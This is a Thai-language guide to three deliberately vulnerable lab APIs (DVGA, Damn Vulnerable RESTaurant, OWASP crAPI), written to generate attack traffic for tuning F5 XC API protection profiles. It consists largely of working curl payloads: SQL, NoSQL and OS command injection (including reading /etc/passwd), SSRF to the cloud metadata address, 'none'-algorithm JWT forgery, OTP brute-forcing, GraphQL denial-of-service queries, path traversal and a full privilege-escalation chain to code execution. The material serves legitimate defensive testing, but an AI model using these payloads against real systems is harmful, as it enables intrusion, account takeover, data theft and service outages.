## ภาพรวม

คู่มือนี้รวบรวม API endpoint ทั้งหมด ช่องโหว่ที่ออกแบบไว้โดยตั้งใจ และ attack payload สำหรับแอปพลิเคชันทดสอบความปลอดภัย API ทั้งสามตัว ใช้เพื่อสร้างรูปแบบการสร้างทราฟฟิกสำหรับการพัฒนา F5 XC API protection profile

| แอปพลิเคชัน | โปรโตคอล | เส้นทาง | พอร์ต | การยืนยันตัวตน | ช่องโหว่ |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | ไม่มี (admin: admin/password) | 25 สถานการณ์ |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 หมวดหมู่ OWASP API 2023 |
| **crAPI** | REST (microservices) | `/` | 8888 | JWT (Bearer) | 18+ ความท้าทาย |

### ตัวแปรสภาพแวดล้อม

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

## DVGA (Damn Vulnerable GraphQL Application)

**GraphQL Endpoint:** `POST ${ORIGIN}/dvga/graphql`
**GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
**ข้อมูลประจำตัวผู้ดูแลระบบ:** admin / password

การโต้ตอบกับ DVGA ทั้งหมดใช้ endpoint เดียว (`/dvga/graphql`) ด้วย POST request ที่มี JSON `{"query":"..."}` payload

### ภาพรวม Schema

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← circular reference
```

### รายการ Endpoint

| การดำเนินการ | ประเภท | การยืนยันตัวตน | วัตถุประสงค์ |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | ไม่ | แสดงรายการ paste (SQL injection ผ่าน filter) |
| `paste(id)` | Query | ไม่ | ดึง paste เดียว |
| `me(token)` | Query | ไม่ | ดึงข้อมูลผู้ใช้ด้วย JWT (เสี่ยงต่อการปลอมแปลง) |
| `systemHealth` | Query | ไม่ | ตรวจสอบสถานะระบบ |
| `systemUpdate` | Query | ไม่ | Query ที่ช้า (~82 วินาที, เวกเตอร์ DoS) |
| `systemDiagnostics(cmd)` | Query | admin/password | เรียกใช้คำสั่ง OS ที่อนุญาต |
| `createPaste(title, content, public)` | Mutation | ไม่ | สร้าง paste (XSS ผ่าน content) |
| `importPaste(host, port, path, scheme)` | Mutation | ไม่ | นำเข้า paste จากภายนอก (SSRF, command injection) |
| `uploadPaste(filename, content)` | Mutation | ไม่ | อัปโหลด paste (path traversal) |

### แค็ตตาล็อกช่องโหว่

#### 1. การปฏิเสธบริการ (Denial of Service) (6 สถานการณ์)

**การโจมตีแบบ Batch Query:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**การเรียกซ้ำลึก (circular Owner/Paste references):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**Query ที่ใช้ทรัพยากรสูง (ตอบกลับ ~82 วินาที):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**การทำซ้ำ Field (ทำซ้ำ field 500+ ครั้ง):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**การโจมตีด้วย Alias (1000 aliased operations):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. การเปิดเผยข้อมูล (Information Disclosure) (5 สถานการณ์)

**Introspection (การสำรวจ schema ทั้งหมด):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**Field Suggestions (การพิมพ์ผิดเผยให้เห็น field ที่ถูกต้อง):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**SSRF ผ่าน importPaste (ตรวจสอบบริการภายใน):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. การฉีดโค้ด (Injection) (4 สถานการณ์)

**SQL Injection ผ่านพารามิเตอร์ filter:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**Stored XSS ผ่าน createPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**Log Injection (การปลอมแปลงชื่อ operation):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. การเรียกใช้โค้ด (Code Execution) (3 สถานการณ์)

**OS Command Injection ผ่าน importPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**OS Command ผ่าน systemDiagnostics (ต้องใช้ admin auth):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. การข้ามการอนุญาต (Authorization Bypass) (3 สถานการณ์)

**การปลอมแปลง JWT Token (ยอมรับ token ที่ไม่ได้ลงนาม):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**การเขียนไฟล์ตามอำเภอใจผ่าน uploadPaste (path traversal):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

## RESTaurant API (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**OpenAPI Spec:** `${ORIGIN}/restaurant/openapi.json`
**การยืนยันตัวตน:** JWT ผ่าน form-encoded POST ไปยัง `/restaurant/token`
**บทบาท:** Customer (ค่าเริ่มต้น), Employee, Chef (admin)

### การตั้งค่า: ลงทะเบียนและยืนยันตัวตน

```bash
# ลงทะเบียนผู้ใช้ทดสอบ
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# รับ JWT token (หมายเหตุ: ใช้ form-encoded ไม่ใช่ JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### แค็ตตาล็อกช่องโหว่

#### API1:2023 — การอนุญาตระดับอ็อบเจกต์ที่ไม่สมบูรณ์ (BOLA)

**แก้ไขโปรไฟล์ของผู้ใช้คนอื่น:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**เข้าถึงคำสั่งซื้อของผู้ใช้คนอื่น (สำรวจ offset):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — การยืนยันตัวตนที่ไม่สมบูรณ์

**การ brute-force JWT weak secret (secret คือ 6 หลัก: 97952):**
```bash
# ถอดรหัสและปลอมแปลง token ได้ที่ jwt.io
# Secret: 97952 (สามารถ brute-force ได้ด้วย hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# ปลอมแปลง Chef token:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# ลงนามด้วย secret: 97952
```

#### API3:2023 — การอนุญาตระดับคุณสมบัติอ็อบเจกต์ที่ไม่สมบูรณ์ (BOPLA)

**Mass-assign บทบาทจาก Customer เป็น Chef:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**เส้นทางการยกระดับสิทธิ์: Customer → Employee → Chef:**
```bash
# ขั้นตอนที่ 1: ยกระดับเป็น Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# ขั้นตอนที่ 2: ยกระดับเป็น Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — การอนุญาตระดับฟังก์ชันที่ไม่สมบูรณ์ (BFLA)

**ลบรายการเมนูในฐานะ Customer (ควรต้องใช้ Employee+):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**เปลี่ยนบทบาทของผู้ใช้คนอื่น:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — การปลอมแปลงคำขอฝั่งเซิร์ฟเวอร์ (SSRF)

**ตรวจสอบ endpoint ภายในผ่าน image_url ของเมนู (ต้องมีบทบาท Employee):**
```bash
# ยกระดับเป็น Employee ผ่าน BOPLA ก่อน จากนั้น:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — การฉีดโค้ด (Injection)

**OS Command Injection ผ่านสถิติดิสก์ (ต้องมีบทบาท Chef):**
```bash
# หลังจากยกระดับเป็น Chef:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### ห่วงโซ่การโจมตีเต็มรูปแบบ: จาก Customer สู่ Root

```bash
# 1. ลงทะเบียน
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. รับ token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. ยกระดับเป็น Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. ยืนยันตัวตนใหม่เพื่อรับ token ระดับ Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Command injection (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

## crAPI (OWASP Completely Ridiculous API)

**Web UI:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (จับอีเมลสำหรับการยืนยัน)
**การยืนยันตัวตน:** JWT Bearer token (RS256, เสี่ยงต่อ algorithm confusion)
**สถาปัตยกรรม:** 7 ไมโครเซอร์วิส (identity, community, workshop, postgres, mongo, mailhog, web)

### การตั้งค่า: ลงทะเบียน, ยืนยันอีเมล, เข้าสู่ระบบ

```bash
# 1. ลงทะเบียน
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. ตรวจสอบ MailHog สำหรับอีเมลยืนยัน
# เปิดเบราว์เซอร์ไปที่ ${CRAPI}/mailhog/ หรือใช้ MailHog API:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. เข้าสู่ระบบและรับ JWT token
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### แค็ตตาล็อกความท้าทาย

#### ความท้าทายที่ 1 — BOLA: เข้าถึงตำแหน่งยานพาหนะของผู้ใช้คนอื่น

```bash
# ดึง UUID ยานพาหนะของคุณก่อน
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# เข้าถึงยานพาหนะของผู้ใช้คนอื่น (แทนที่ UUID)
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### ความท้าทายที่ 2 — BOLA: เข้าถึงรายงานช่าง (ไม่ต้องยืนยันตัวตน)

```bash
# การสำรวจ ID แบบลำดับ — ไม่ต้องใช้ token
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
done
```

#### ความท้าทายที่ 3 — การยืนยันตัวตนที่ไม่สมบูรณ์: Brute-Force OTP รีเซ็ตรหัสผ่าน

```bash
# ขอ OTP สำหรับเหยื่อ
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Brute-force OTP 4 หลัก (v2 ไม่มี rate limiting)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### ความท้าทายที่ 4 — การเปิดเผยข้อมูล: รั่วไหลอีเมลช่าง

```bash
curl -sf ${CRAPI}/workshop/api/mechanic \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
```

#### ความท้าทายที่ 5 — การเปิดเผยข้อมูล: พารามิเตอร์การแปลงวิดีโอภายใน

```bash
# อัปโหลดวิดีโอ จากนั้นตรวจสอบการตอบกลับ
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# มองหา field conversion_params ในการตอบกลับ
```

#### ความท้าทายที่ 6 — DoS: Layer 7 ผ่านการติดต่อช่าง

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"Engine issue",
    "vin":"VEHICLE_VIN",
    "mechanic_api":"http://localhost:8080/api",
    "repeat_request_if_failed":true,
    "number_of_repeats":100
  }'
```

#### ความท้าทายที่ 7 — BFLA: ลบวิดีโอผ่าน Admin Endpoint

```bash
# ผู้ใช้ทั่วไปสามารถเข้าถึง admin endpoint
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### ความท้าทายที่ 8 & 9 — Mass Assignment: รับสินค้าฟรีผ่านการแก้ไขคำสั่งซื้อ

```bash
# เปลี่ยน GET เป็น PUT แก้ไข status และ quantity
curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"status":"returned","quantity":100}'
```

#### ความท้าทายที่ 10 — Command Injection ผ่านพารามิเตอร์การแปลงวิดีโอ

```bash
curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
```

#### ความท้าทายที่ 11 — SSRF ผ่านการติดต่อช่าง

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"test",
    "vin":"VIN123",
    "mechanic_api":"http://169.254.169.254/latest/meta-data/",
    "repeat_request_if_failed":false,
    "number_of_repeats":0
  }'
```

#### ความท้าทายที่ 12 — NoSQL Injection: ดึงรหัสคูปอง

```bash
curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":1}}'
```

#### ความท้าทายที่ 13 — SQL Injection: แลกคูปองซ้ำหลายครั้ง

```bash
curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
```

#### ความท้าทายที่ 14 — การเข้าถึงคำสั่งซื้อโดยไม่ต้องยืนยันตัวตน

```bash
# ไม่มี Authorization header — ยังคงส่งข้อมูลกลับมา
for i in 1 2 3 4 5; do
  curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
  echo ""
done
```

#### ความท้าทายที่ 15 — JWT Algorithm Confusion

```bash
# ปลอมแปลง JWT ด้วย algorithm "none" (ไม่มีการตรวจสอบลายเซ็น):
# 1. ตั้ง header: {"alg":"none","typ":"JWT"} และ base64url-encode
# 2. ตั้ง payload: {"email":"admin@example.com","role":"admin"} และ base64url-encode
# 3. รวมด้วยจุด เว้น signature ว่าง: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

## รูปแบบการสร้างทราฟฟิก

### ระยะที่ 1: Baseline (Happy Path)

สร้างทราฟฟิกที่ถูกต้องตามปกติเพื่อกำหนดพฤติกรรม API ปกติก่อนทดสอบรูปแบบการโจมตี

**DVGA baseline:**
```bash
# Query ปกติ
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**RESTaurant baseline:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**crAPI baseline:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### ระยะที่ 2: ทราฟฟิกการโจมตีตามหมวดหมู่ OWASP

**การทดสอบ BOLA:** สำรวจ ID แบบลำดับ สลับตัวระบุผู้ใช้ในคำขอ เข้าถึงทรัพยากรโดยไม่มีความเป็นเจ้าของ

**การทดสอบ Injection:** SQL payload ในพารามิเตอร์ filter/coupon, GraphQL query injection, OS command injection ผ่าน field พารามิเตอร์

**การทดสอบการข้ามการยืนยันตัวตน:** ปลอมแปลง JWT token, brute-force OTP, ใช้ API เวอร์ชันเก่า, algorithm confusion

**การทดสอบ SSRF:** URL ภายในในพารามิเตอร์ `importPaste`, `image_url` และ `mechanic_api`

**การทดสอบ DoS:** การโจมตี GraphQL แบบ batch/recursion/alias, `repeat_request_if_failed` ที่มีจำนวนสูง

### ระยะที่ 3: ห่วงโซ่การโจมตีแบบมีสถานะ

การโจมตีบางประเภทต้องใช้ลำดับหลายขั้นตอนที่มีสถานะ:

1. **ห่วงโซ่การยกระดับสิทธิ์ RESTaurant:** ลงทะเบียน → Token → PATCH บทบาทเป็น Chef → ยืนยันตัวตนใหม่ → Command injection
2. **ขั้นตอนเต็มของ crAPI:** สมัครสมาชิก → ยืนยันอีเมล (MailHog) → เข้าสู่ระบบ → เพิ่มยานพาหนะ → ติดต่อช่าง (SSRF) → การแก้ไขคำสั่งซื้อ
3. **DVGA จากการสำรวจสู่การใช้ประโยชน์:** Introspection → ค้นพบ systemDiagnostics → Brute-force ข้อมูลประจำตัว admin → การเรียกใช้คำสั่ง OS
